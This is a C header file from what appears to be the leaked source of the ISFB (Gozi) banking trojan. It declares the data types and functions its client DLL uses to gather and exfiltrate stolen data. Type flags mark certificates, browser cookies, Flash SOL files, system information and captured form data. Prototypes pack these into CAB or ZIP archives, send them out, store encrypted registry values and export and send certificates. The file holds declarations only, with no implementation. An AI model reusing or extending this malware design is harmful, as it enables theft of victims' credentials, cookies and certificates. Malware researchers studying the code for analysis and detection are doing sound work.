//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: files.h
// $Revision: 355 $
// $Date: 2014-09-27 18:47:52 +0400 (Сб, 27 сен 2014) $
// description:
//	CRM client dll. Files manipulation functions. 


typedef struct	_SEC_INFO
{
	ULONGLONG	hSection;		// ULONGLONG is for compatibility with both x86 and x64 processes
	ULONG		SizeOfSection;
	ULONG		NameLength;
	ULONG		Flags;
	CHAR		Name[0x80];
} SEC_INFO, *PSEC_INFO;


typedef struct	_TEMP_NAME
{
	FILETIME	Time;
	UCHAR		Type;
} TEMP_NAME, *PTEMP_NAME;

// File section flags
#define	FILE_TYPE_ANY			SEND_ID_UNKNOWN
#define	FILE_TYPE_CERT			SEND_ID_CERTS
#define	FILE_TYPE_COOKIE		SEND_ID_COOKIES
#define	FILE_TYPE_SYSINFO		SEND_ID_SYSINFO
#define	FILE_TYPE_FORM			SEND_ID_FORM1
#define	FILE_TYPE_MASK			0xff

#define	FILE_TYPE_SOL			0x10
#define	FILE_TYPE_IE_COOKIE		0x11
#define	FILE_TYPE_FF_COOKIE		0x12

#define	FILE_DELETE_ON_RELEASE	0x100


// Functions defined within FILES.C
BOOL	FilesCreateSectionFound(PSEC_INFO SecInfo);
WINERROR FilesMakeCab(LPTSTR SourcePath, LPTSTR CabPath);
WINERROR FilesMakeZip(LPTSTR pSourcePath, LPTSTR pZipPath);
#ifdef _USE_ZIP
 #define FilesPackFiles(pSource, pPacked)	FilesMakeZip(pSource, pPacked)
#else
 #define FilesPackFiles(pSource, pPacked)	FilesMakeCab(pSource, pPacked)
#endif

WINERROR FilesGetSysInfo(LPTSTR* pFileName);
WINERROR WINAPI FilesThread(PWCHAR Mask);
WINERROR FilesListAddW(LPWSTR pName, UCHAR Type);
WINERROR FilesListAddA(LPSTR pName, UCHAR Type);
WINERROR FilesCreateSection(LPWSTR pFilePath, PSEC_INFO	SecInfo);
WINERROR FilesQueryFileSection(LPWSTR pFilePath, PHANDLE pHandle, PULONG pSize);
WINERROR FilesAddEncryptedValue(LPTSTR pKeyName, LPTSTR	pValueName, PCHAR pValue, ULONG ValueSize);

WINERROR __stdcall FilesPackAndSend(PVOID Context, LPTSTR	FilePath, ULONG Flags);
WINERROR __stdcall FilesPackAndSendBuffer(PVOID Context, PCHAR pBuffer, ULONG Size, ULONG FileType);

// Functions defined within CERTS.C
BOOL WINAPI	ExportSendCerts(PVOID Context);